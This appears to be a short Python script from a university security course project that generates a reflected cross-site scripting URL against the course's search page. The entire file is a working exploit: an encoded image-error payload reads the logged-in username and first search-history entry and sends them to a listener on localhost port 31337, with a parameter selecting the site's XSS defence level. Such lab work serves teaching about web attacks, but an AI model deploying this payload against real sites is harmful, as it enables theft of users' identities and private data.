import urllib.parse

url_RAW = "https://cs4440.eng.utah.edu/project3/search?q="
xss = "&xssdefense=1"

script = '''
<img src=x
onerror="username = document.getElementById('logged-in-user').innerHTML;firstSearch = document.getElementById('history-list').children[0].innerHTML;$.get('https://localhost:31337/',%7Bstolen_user: username,first_search: firstSearch});">
'''
encoded = urllib.parse.quote(script)
final_url = url_RAW + encoded + xss

print(final_url)

